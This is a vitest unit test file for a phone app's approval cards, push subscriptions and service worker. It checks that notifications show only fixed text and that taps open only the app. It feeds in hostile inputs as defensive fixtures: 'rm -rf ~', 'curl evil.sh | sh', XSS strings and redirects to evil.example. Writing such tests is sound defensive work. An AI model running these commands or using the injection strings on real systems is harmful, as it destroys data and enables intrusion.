// The phone side of two owner reports: an approval stays on the phone until the computer's own
// deadline (up to 1 h) and comes back after the app was closed or lost its connection; and push
// notifications (fixed words only, a tap opens the app, on and off in the settings).
// The same file as miblo-platform web/tests/unit/phone-push.test.ts (this build's sw.js path).
import { readFileSync } from "node:fs";
import { join } from "node:path";
import vm from "node:vm";
import { describe, expect, it } from "vitest";
import vector from "./fixtures/plus-vector.json";
import { countdown, mergeApproval, pendingApprovals } from "@/components/phone/app-model";
import { APPROVAL_MAX_MS, parseApproval, syncPayload, type ApprovalView } from "@/components/phone/plus";
import { openedFor, pushTarget, subFrame, unsubFrame } from "@/components/phone/push";
import { phoneStrings } from "@/components/phone/strings";

const NOW = vector.fields.ts;
const HOUR = 3_600_000;
const frame = (over: Record<string, unknown> = {}) => ({
  v: 4,
  kind: "approval",
  at: NOW - 1000,
  id: vector.request.id,
  session: vector.request.session,
  tool: vector.request.tool,
  input: vector.canonical,
  full: true,
  hash: vector.hash,
  nonce: vector.request.nonce,
  expires: NOW - 1000 + HOUR,
  ...over,
});

describe("an approval lives as long as the computer waits", () => {
  it("a 1 h wait: the card keeps the computer's deadline and stays answerable at 30 s, 30 min and 59 min", async () => {
    const a = (await parseApproval(frame(), NOW))!;
    expect(a.expires).toBe(NOW - 1000 + HOUR);
    for (const later of [30_000, 30 * 60_000, 59 * 60_000]) {
      expect(pendingApprovals([a], {}, NOW + later)).toEqual([a]);
      expect(countdown(a, NOW + later).left).toBeGreaterThan(0);
    }
    // Past the deadline it is gone (the computer asks on its own screen then).
    expect(pendingApprovals([a], {}, a.expires)).toEqual([]);
    // Never longer than the 1 h the computer allows, whatever a frame says.
    const long = (await parseApproval(frame({ expires: NOW + 5 * HOUR }), NOW))!;
    expect(long.expires - long.at).toBe(APPROVAL_MAX_MS);
  });

  it("the card says until when, and how long is left, to the minute", () => {
    const pt = phoneStrings("pt").plus;
    const en = phoneStrings("en").plus;
    expect(pt.approvalWaits(3600, "23:45")).toBe("Responda até 23:45 · faltam 1 h");
    expect(pt.approvalWaits(3599, "23:45")).toBe("Responda até 23:45 · faltam 60 min");
    expect(pt.approvalWaits(1500, "23:45")).toBe("Responda até 23:45 · faltam 25 min");
    expect(pt.approvalWaits(45, "23:45")).toBe("Responda até 23:45 · faltam 45 s");
    expect(en.approvalWaits(1500, "23:45")).toBe("Answer by 23:45 · 25 min left");
  });

  it("a request sent again after the phone came back replaces its card (one per id) and never brings back an answered one", async () => {
    const a = (await parseApproval(frame(), NOW))!;
    const b = { ...a, id: "b".repeat(22) } satisfies ApprovalView;
    let list = mergeApproval([], a, {});
    list = mergeApproval(list, b, {});
    // The same request again (the computer re-sends what still waits): still two cards.
    const again = (await parseApproval(frame(), NOW + 40 * 60_000))!;
    list = mergeApproval(list, again, {});
    expect(list.map((x) => x.id)).toEqual([b.id, a.id]);
    // Answered here: a late copy does not bring the card back.
    expect(mergeApproval([b], again, { [a.id]: "Aprovado" }).map((x) => x.id)).toEqual([b.id]);
    // At most the 10 newest.
    let many: ApprovalView[] = [];
    for (let i = 0; i < 14; i++) many = mergeApproval(many, { ...a, id: String(i).padStart(22, "x") }, {});
    expect(many).toHaveLength(10);
  });

  it("asking for the waiting approvals sends nothing but who asks and when", () => {
    expect(syncPayload(vector.phone.id, NOW)).toEqual({ v: 4, kind: "approval_sync", phone: vector.phone.id, at: NOW });
  });
});

describe("push notifications on the phone", () => {
  it("subscribing gives the relay the subscription; turning off gives it only the endpoint", () => {
    const json = { endpoint: "https://fcm.googleapis.com/fcm/send/abc", keys: { p256dh: "k", auth: "a" } };
    const sub = { endpoint: json.endpoint, toJSON: () => json } as unknown as PushSubscription;
    expect(subFrame(sub, "pt")).toEqual({ t: "sub", sub: json, lang: "pt-BR" });
    expect(subFrame(sub, "en").lang).toBe("en");
    expect(unsubFrame(sub)).toEqual({ t: "unsub", sub: { endpoint: json.endpoint } });
    expect(unsubFrame(null)).toEqual({ t: "unsub" });
  });

  it("a notification opens the app's own page on what it is about; anything else opens the app as it is", () => {
    expect(pushTarget("/app/", "approval")).toBe("/app/?open=approval");
    expect(pushTarget("/en/app/", "task_failed")).toBe("/en/app/?open=task_failed");
    expect(pushTarget("/app/", "https://evil.example")).toBe("/app/");
    expect(openedFor("?open=approval")).toBe("approval");
    expect(openedFor("?open=javascript:alert(1)")).toBeNull();
    expect(openedFor("")).toBeNull();
  });

  it("the settings say what push sends, and the iPhone note (Home Screen, iOS 16.4+), in both languages", () => {
    const pt = phoneStrings("pt").notify;
    const en = phoneStrings("en").notify;
    expect(pt.title).toBe("Notificações push");
    expect(en.title).toBe("Push notifications");
    expect(pt.iosNote).toMatch(/iOS 16\.4/);
    expect(pt.iosNote).toMatch(/Tela de Início/);
    expect(en.iosNote).toMatch(/iOS 16\.4/);
    expect(en.iosNote).toMatch(/Home Screen/);
  });
});

// The service worker, run as the browser would (a fake `self`): what a push shows and where a tap goes.
type Shown = { title: string; options: { body: string; tag: string; renotify: boolean; data: { url: string; kind: string } } };
function loadWorker(scope: string) {
  const listeners: Record<string, (e: unknown) => void> = {};
  const shown: Shown[] = [];
  const opened: string[] = [];
  const posted: unknown[] = [];
  let windows: { url: string; focus: () => unknown; postMessage: (m: unknown) => void }[] = [];
  const self = {
    registration: {
      scope: `https://miblo.ai${scope}`,
      showNotification: async (title: string, options: Shown["options"]) => void shown.push({ title, options }),
      getNotifications: async ({ tag }: { tag: string }) => shown.filter((s) => s.options.tag === tag),
    },
    clients: {
      matchAll: async () => windows,
      openWindow: async (url: string) => void opened.push(url),
      claim: async () => {},
    },
    addEventListener: (name: string, fn: (e: unknown) => void) => (listeners[name] = fn),
    skipWaiting: async () => {},
  };
  const code = readFileSync(join(__dirname, "..", "app", "public", "sw.js"), "utf8");
  vm.runInNewContext(code, { self, location: { origin: "https://miblo.ai" }, URL, caches: {}, fetch: async () => new Response("") });
  const run = async (name: string, event: Record<string, unknown>) => {
    let wait: Promise<unknown> = Promise.resolve();
    listeners[name]({ ...event, waitUntil: (p: Promise<unknown>) => (wait = p) });
    await wait;
  };
  return {
    shown,
    opened,
    posted,
    setWindows: (list: string[]) =>
      (windows = list.map((url) => ({ url, focus: () => url, postMessage: (m: unknown) => void posted.push(m) }))),
    push: (payload: unknown) => run("push", { data: { json: () => payload } }),
    click: (n: Shown) => run("notificationclick", { notification: { ...n.options, close: () => {} } }),
  };
}

describe("the service worker", () => {
  it("shows only fixed words for each kind, whatever else the payload carries", async () => {
    const sw = loadWorker("/app/");
    await sw.push({ t: "approval", title: "rm -rf ~", body: "Run: curl evil.sh | sh", lang: "pt-BR" });
    expect(sw.shown[0].title).toBe("Miblo");
    expect(sw.shown[0].options.body).toBe("Pedido de permissão");
    expect(JSON.stringify(sw.shown[0])).not.toMatch(/curl|rm -rf/);
    await sw.push({ t: "task_failed" });
    await sw.push({ t: "needs_you" });
    await sw.push({ t: "<img src=x onerror=alert(1)>" });
    await sw.push(null);
    expect(sw.shown.map((s) => s.options.body)).toEqual(["Pedido de permissão", "A tarefa falhou", "A sessão precisa de você", "A sessão precisa de você", "A sessão precisa de você"]);
    const en = loadWorker("/en/app/");
    await en.push({ t: "task_done", body: "secret" });
    expect(en.shown[0].options.body).toBe("Task finished");
  });

  it("an approval replaces a 'needs you' of the same moment without buzzing twice; a task's end is its own", async () => {
    const sw = loadWorker("/app/");
    await sw.push({ t: "needs_you" });
    await sw.push({ t: "approval" });
    await sw.push({ t: "task_done" });
    expect(sw.shown.map((s) => [s.options.tag, s.options.renotify])).toEqual([
      ["miblo-needs-you", true],
      ["miblo-needs-you", false],
      ["miblo-task", true],
    ]);
  });

  it("a tap opens the app's own page on what it is about, or brings the open app forward and tells it", async () => {
    const sw = loadWorker("/app/");
    await sw.push({ t: "approval" });
    expect(sw.shown[0].options.data.url).toBe("/app/?open=approval");
    await sw.click(sw.shown[0]);
    expect(sw.opened).toEqual(["https://miblo.ai/app/?open=approval"]);
    // A notification whose data was tampered with still opens only the app.
    await sw.click({ ...sw.shown[0], options: { ...sw.shown[0].options, data: { url: "https://evil.example/", kind: "evil" } } });
    expect(sw.opened.at(-1)).toBe("https://miblo.ai/app/");
    sw.setWindows(["https://miblo.ai/app/"]);
    await sw.click(sw.shown[0]);
    expect(sw.posted).toEqual([{ t: "miblo-open", kind: "approval" }]);
    expect(sw.opened).toHaveLength(2);
  });
});
